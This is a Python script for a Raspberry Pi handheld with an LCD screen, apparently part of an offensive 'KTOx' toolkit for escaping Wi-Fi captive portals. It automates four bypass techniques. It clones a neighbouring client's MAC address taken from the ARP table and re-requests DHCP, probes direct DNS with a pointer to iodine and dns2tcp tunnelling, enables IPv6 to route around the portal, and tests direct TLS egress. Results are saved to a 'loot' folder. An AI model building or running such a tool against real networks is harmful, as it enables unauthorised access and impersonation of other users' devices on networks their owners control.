#!/usr/bin/env python3
"""
KTOx Captive Portal Escape - Dark Red KTOx Style
================================================
Multi-technique captive portal bypass toolkit.
"""

import os
import sys
import time
import subprocess
import socket
import re
from datetime import datetime
from pathlib import Path

# KTOx paths
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
if "/root/KTOx" not in sys.path:
    sys.path.insert(0, "/root/KTOx")

try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False

from _input_helper import get_button, flush_input

# ── Constants ────────────────────────────────────────────────────────────────
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16
}
W, H = 128, 128

LOOT_DIR = Path("/root/KTOx/loot/PortalEscape")
IFACE = "wlan0"

# Dark Red KTOx Palette
BG_COLOR   = "#0A0000"   # deep black-red
HEADER     = "#8B0000"   # dark red
ACCENT     = "#FF3333"   # bright red
TEXT       = "#FFBBBB"   # light red-white
GOOD       = "#00FFAA"   # success green
BAD        = "#FF5555"   # error red
PARTIAL    = "#FFAA00"   # warning orange

# ── LCD Setup ────────────────────────────────────────────────────────────────
lcd_hw = None
FONT_SM = None
FONT_MD = None

if HAS_HW:
    try:
        GPIO.setmode(GPIO.BCM)
        GPIO.setwarnings(False)
        for p in PINS.values():
            GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)

        lcd_hw = LCD_1in44.LCD()
        lcd_hw.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        lcd_hw.LCD_Clear()

        try:
            FONT_SM = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 8)
            FONT_MD = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 9)
        except:
            FONT_SM = FONT_MD = ImageFont.load_default()
    except Exception as e:
        print(f"LCD init failed: {e}")

def _push(img):
    if lcd_hw:
        try:
            lcd_hw.LCD_ShowImage(img, 0, 0)
        except:
            pass

def lcd_status(title, lines, accent=None):
    accent = accent or ACCENT
    img = Image.new("RGB", (W, H), BG_COLOR)
    draw = ImageDraw.Draw(img)

    # Header
    draw.rectangle((0, 0, W, 16), fill=HEADER)
    draw.text((4, 2), title[:20], fill=(242, 243, 244), font=FONT_MD)

    y = 20
    for line in lines[:8]:
        draw.text((4, y), str(line)[:22], fill=TEXT, font=FONT_SM)
        y += 11

    # Footer
    draw.rectangle((0, 116, W, 128), fill="#220000")
    draw.text((4, 118), "K1=Run  K2=All  K3=Exit", fill=ACCENT, font=FONT_SM)

    _push(img)

    if not HAS_HW:
        print(f"[{title}]", *lines)

# ── Techniques ───────────────────────────────────────────────────────────────
TECHNIQUES = [
    {"id": "mac",   "name": "MAC Clone",    "status": "?", "detail": ""},
    {"id": "dns",   "name": "DNS Probe",    "status": "?", "detail": ""},
    {"id": "ipv6",  "name": "IPv6 Escape",  "status": "?", "detail": ""},
    {"id": "https", "name": "HTTPS Bypass", "status": "?", "detail": ""},
]

def _run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)

def _internet_ok():
    try:
        s = socket.create_connection(("1.1.1.1", 80), timeout=5)
        s.sendall(b"GET / HTTP/1.0\r\nHost: 1.1.1.1\r\n\r\n")
        data = s.recv(512).decode("utf-8", "ignore")
        s.close()
        return "captive" not in data.lower() and "portal" not in data.lower()
    except:
        return False

def _save_result(tech_name, lines):
    LOOT_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = LOOT_DIR / f"{tech_name}_{ts}.txt"
    try:
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
    except:
        pass

# ── Individual Techniques ────────────────────────────────────────────────────
def run_mac_clone():
    lcd_status("MAC CLONE", ["Scanning ARP + WiFi..."])
    time.sleep(1)

    macs = []
    out = _run("ip neigh show")
    macs.extend(re.findall(r"lladdr\s+([0-9a-f:]{17})", out, re.I))
    out2 = _run("arp -a")
    macs.extend(re.findall(r"([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})", out2, re.I))

    macs = [m for m in macs if not m.startswith(("ff:", "01:", "33:"))]

    if not macs:
        lines = ["No neighbors found.", "Connect to AP first."]
        return "X", lines

    target = macs[0]
    lcd_status("MAC CLONE", [f"Cloning {target}..."])

    _run(f"ip link set {IFACE} down")
    _run(f"ip link set {IFACE} address {target}")
    _run(f"ip link set {IFACE} up")
    time.sleep(1.5)

    _run(f"dhclient -r {IFACE} 2>/dev/null; dhclient {IFACE} 2>/dev/null", timeout=15)

    if _internet_ok():
        lines = [f"Cloned: {target}", "DHCP OK → Internet OPEN!"]
        status = "OK"
    else:
        lines = [f"Cloned: {target}", "No internet yet.", "Portal may check cookies/UA."]
        status = "~"

    _save_result("mac_clone", lines)
    return status, lines


def run_dns_probe():
    lcd_status("DNS PROBE", ["Querying 8.8.8.8 directly..."])
    time.sleep(1)

    out = _run("dig +short @8.8.8.8 google.com A 2>/dev/null || nslookup google.com 8.8.8.8 2>/dev/null", timeout=8)
    real_ip = re.findall(r"\b(?!192\.|10\.|172\.|127\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", out)

    if real_ip:
        lines = [f"DNS OK: {real_ip[0]}", "Direct DNS works!", "iodine / dns2tcp viable."]
        status = "OK"
    else:
        lines = ["DNS filtered or hijacked.", "Tunnel tools unlikely."]
        status = "X"

    _save_result("dns_probe", lines)
    return status, lines


def run_ipv6_escape():
    lcd_status("IPv6 ESCAPE", ["Enabling IPv6..."])
    _run("sysctl -w net.ipv6.conf.all.disable_ipv6=0 2>/dev/null")
    _run(f"sysctl -w net.ipv6.conf.{IFACE}.disable_ipv6=0 2>/dev/null")
    time.sleep(1)

    addr_out = _run(f"ip -6 addr show {IFACE}")
    global_addrs = re.findall(r"inet6\s+([0-9a-f:]+)/\d+\s+scope global", addr_out, re.I)

    if not global_addrs:
        return "X", ["No global IPv6 address.", "AP may not support IPv6."]

    ping = _run("ping6 -c 2 -W 3 2001:4860:4860::8888 2>/dev/null", timeout=8)
    if "received" in ping:
        lines = [f"IPv6: {global_addrs[0][:19]}...", "Ping6 SUCCESS!", "Portal bypassed via IPv6."]
        status = "OK"
    else:
        lines = ["IPv6 address present", "but no external routing."]
        status = "~"

    _save_result("ipv6_escape", lines)
    return status, lines


def run_https_bypass():
    lcd_status("HTTPS BYPASS", ["Testing direct TLS..."])
    time.sleep(1)

    targets = [("1.1.1.1", 443), ("8.8.8.8", 443)]
    for ip, port in targets:
        try:
            s = socket.create_connection((ip, port), timeout=5)
            s.sendall(b"\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03")
            data = s.recv(64)
            s.close()
            if data and data[0] == 0x16:
                lines = [f"TLS {ip}:443 OPEN!", "Port 443 not filtered."]
                _save_result("https_bypass", lines)
                return "OK", lines
        except:
            pass

    try:
        s = socket.create_connection(("neverssl.com", 80), timeout=5)
        s.sendall(b"GET / HTTP/1.0\r\nHost: neverssl.com\r\n\r\n")
        resp = s.recv(256).decode("utf-8", "ignore")
        s.close()
        if "neverssl" in resp.lower():
            lines = ["HTTP open (unfiltered)", "HTTPS may still be blocked."]
            status = "~"
        else:
            lines = ["HTTP redirected to portal."]
            status = "X"
    except:
        lines = ["Both HTTP and HTTPS blocked."]
        status = "X"

    _save_result("https_bypass", lines)
    return status, lines


# ── Menu Rendering ───────────────────────────────────────────────────────────
def render_menu(cursor):
    img = Image.new("RGB", (W, H), BG_COLOR)
    draw = ImageDraw.Draw(img)

    draw.rectangle((0, 0, W, 16), fill=HEADER)
    draw.text((4, 2), "CAPTIVE ESCAPE", fill=(242, 243, 244), font=FONT_MD)

    ok = _internet_ok()
    badge = "FREE" if ok else "LOCKED"
    badge_col = GOOD if ok else BAD
    draw.text((92, 3), badge, fill=badge_col, font=FONT_SM)

    y = 20
    for i in range(4):
        idx = (cursor + i) % len(TECHNIQUES)
        t = TECHNIQUES[idx]
        sel = (i == 0)

        sc = "+" if t["status"] == "OK" else ("x" if t["status"] == "X" else "~")
        col = GOOD if t["status"] == "OK" else (BAD if t["status"] == "X" else PARTIAL)

        line = f"[{sc}] {t['name']}"
        if sel:
            draw.rectangle((0, y, W, y + 11), fill=HEADER)
            draw.text((4, y), line[:21], fill=(242, 243, 244), font=FONT_SM)
        else:
            draw.text((4, y), line[:21], fill=col, font=FONT_SM)
        y += 12

    draw.text((4, H - 18), "K1=Run   K2=All   K3=Exit", fill=ACCENT, font=FONT_SM)
    _push(img)


def run_technique(idx):
    tech = TECHNIQUES[idx]
    lcd_status("RUNNING", [tech["name"], "", "Please wait..."])

    runner_map = {
        "mac": run_mac_clone,
        "dns": run_dns_probe,
        "ipv6": run_ipv6_escape,
        "https": run_https_bypass
    }
    runner = runner_map.get(tech["id"])

    try:
        status, lines = runner()
    except Exception as e:
        status, lines = "X", [str(e)[:40]]

    tech["status"] = status
    tech["detail"] = lines[0] if lines else ""
    lcd_status(tech["name"], lines, accent=GOOD if status == "OK" else BAD)


def main():
    flush_input()
    cursor = 0

    lcd_status("CAPTIVE ESCAPE", ["DarkSec KTOx Toolkit", "", "KEY1 = single", "KEY2 = all techniques"])
    time.sleep(1.8)
    render_menu(cursor)

    last_btn = 0.0

    while True:
        now = time.monotonic()
        btn = get_button(PINS, GPIO) if HAS_HW else None

        if btn and (now - last_btn) > 0.25:
            last_btn = now

            if btn == "UP":
                cursor = max(0, cursor - 1)
                render_menu(cursor)
            elif btn == "DOWN":
                cursor = min(len(TECHNIQUES) - 1, cursor + 1)
                render_menu(cursor)
            elif btn == "KEY1":
                run_technique(cursor)
                time.sleep(3.5)
                render_menu(cursor)
            elif btn == "KEY2":
                for i in range(len(TECHNIQUES)):
                    cursor = i
                    render_menu(cursor)
                    run_technique(i)
                    time.sleep(2)
                render_menu(cursor)
            elif btn == "KEY3":
                break

        time.sleep(0.06)

    # Summary
    opened = [t for t in TECHNIQUES if t["status"] == "OK"]
    if opened:
        lcd_status("SUMMARY", [f"{len(opened)} bypass(es) found!"] + [f"+ {t['name']}" for t in opened], accent=GOOD)
    else:
        lcd_status("SUMMARY", ["No bypasses found.", "Portal still locked."], accent=BAD)

    time.sleep(4)

    if HAS_HW:
        try:
            GPIO.cleanup()
        except:
            pass


if __name__ == "__main__":
    main()
